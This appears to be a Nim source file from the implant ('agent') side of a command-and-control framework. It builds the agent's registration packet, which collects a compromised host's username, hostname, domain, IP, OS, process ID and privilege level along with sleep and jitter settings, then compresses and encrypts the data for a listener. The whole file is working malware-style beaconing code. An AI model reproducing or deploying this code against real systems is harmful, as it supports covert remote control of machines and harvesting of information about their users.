import zippy
import ../../../common/[serialize, sequence, crypto, utils]
import ../../../types/[common, agent, protocol]

proc createRegistration*(ctx: AgentCtx, metadata: AgentMetadata): Registration = 
    return Registration(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_REGISTER),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: string.toUuid(ctx.agentId),
            seqNr: nextSequence(string.toUuid(ctx.agentId)),                              
            iv: generateBytes(Iv),
            gmac: default(AuthenticationTag)
        ), 
        agentPublicKey: ctx.agentPublicKey,
        metadata: metadata
    )

proc serializeRegistrationData*(ctx: AgentCtx, data: var Registration): seq[byte] = 

    var packer = Packer.init()

    # Serialize registration data
    packer 
        .add(data.metadata.listenerId)
        .addDataWithLengthPrefix(data.metadata.username)
        .addDataWithLengthPrefix(data.metadata.hostname)
        .addDataWithLengthPrefix(data.metadata.domain)
        .addDataWithLengthPrefix(data.metadata.ip)
        .addDataWithLengthPrefix(data.metadata.os)
        .addDataWithLengthPrefix(data.metadata.process)
        .add(data.metadata.pid)
        .add(data.metadata.isElevated)
        .add(data.metadata.sleep)
        .add(data.metadata.jitter)
        .add(data.metadata.modules)

    let metadata = packer.pack()
    packer.reset()

    # Compress payload body
    let compressedPayload = compress(metadata, BestCompression, dfGzip)

    # Encrypt metadata
    let (encData, gmac) = encrypt(ctx.sessionKey, data.header.iv, compressedPayload, data.header.seqNr)

    # Set authentication tag (GMAC)
    data.header.gmac = gmac

    # Serialize header
    let header = packer.serializeHeader(data.header, uint32(encData.len))
    packer.reset()

    # Serialize the agent's public key to add it to the header
    packer.addData(data.agentPublicKey)
    let publicKey = packer.pack()

    return header & publicKey & encData
